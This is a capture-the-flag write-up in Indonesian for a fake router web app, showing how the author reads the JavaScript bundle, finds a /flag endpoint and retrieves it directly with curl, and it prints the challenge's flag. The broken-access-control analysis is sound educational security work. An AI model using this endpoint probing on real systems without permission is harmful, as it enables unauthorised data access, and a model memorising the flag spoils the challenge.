# a Cute Magical Router Gateway

## Ringkasan

Challenge ini berupa aplikasi web router palsu yang dibangun sebagai single page application. Dari halaman utama terlihat hanya ada form login, tetapi bundle JavaScript di sisi client memperlihatkan endpoint backend yang dipakai aplikasi.

Flag ditemukan karena endpoint `/flag` bisa diakses langsung tanpa autentikasi. Jadi proses login hanya membatasi tampilan di browser, bukan benar-benar melindungi data di backend.

## Target

```
http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/
```

## Enumerasi Awal

Saya mulai dari request ke halaman utama:

```bash
curl -i -sS 'http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/'
```

Responsnya adalah HTML sederhana yang memuat file JavaScript dan CSS:

```html
<script type="module" crossorigin src="/assets/index-B3EwX341.js"></script>
<link rel="stylesheet" crossorigin href="/assets/index-D3R2eyxq.css">
```

Server yang dipakai adalah Werkzeug/Python, tetapi halaman utamanya sendiri adalah aplikasi React statis.

## Analisis Bundle JavaScript

File JavaScript diunduh dan dicari string penting seperti `fetch`, `password`, `flag`, dan `login`:

```bash
curl -sS 'http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/assets/index-B3EwX341.js' -o index-B3EwX341.js
rg -n "fetch|password|flag|login" index-B3EwX341.js
```

Dari bundle terlihat alur login aplikasi:

1. User mengisi username dan password.
2. Browser mengirim request ke `/validate-password`.
3. Jika respons `success` bernilai `true`, browser mengambil flag dari `/flag`.

Potongan logika pentingnya:

```js
fetch("/validate-password", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username, password })
})

fetch("/flag")
```

Ini memberi petunjuk bahwa flag mungkin tidak benar-benar dikunci oleh session server, karena client langsung memanggil endpoint `/flag` setelah login.

## Eksploitasi

Saya coba akses endpoint `/flag` secara langsung:

```bash
curl -i -sS 'http://66ccb9a8-185d-4577-98e8-7851c584ebe8.74.113.234.79.nip.io:8880/flag'
```

Ternyata endpoint tersebut langsung mengembalikan flag tanpa cookie, session, bearer token, atau bukti login apa pun:

```json
{"flag":"THEM?!CTF{02783fcd-3d0d-4bd9-843f-b84f73c4c2f4}"}
```

## Vulnerability

Masalah utamanya adalah broken access control. Backend menyediakan endpoint sensitif `/flag`, tetapi tidak melakukan validasi autentikasi di endpoint tersebut.

Form login hanya dipakai untuk mengubah state di sisi React client. Karena proteksi dilakukan di client, siapa pun tetap bisa memanggil endpoint backend secara langsung dengan `curl`.

## Flag

```text
THEM?!CTF{02783fcd-3d0d-4bd9-843f-b84f73c4c2f4}
```

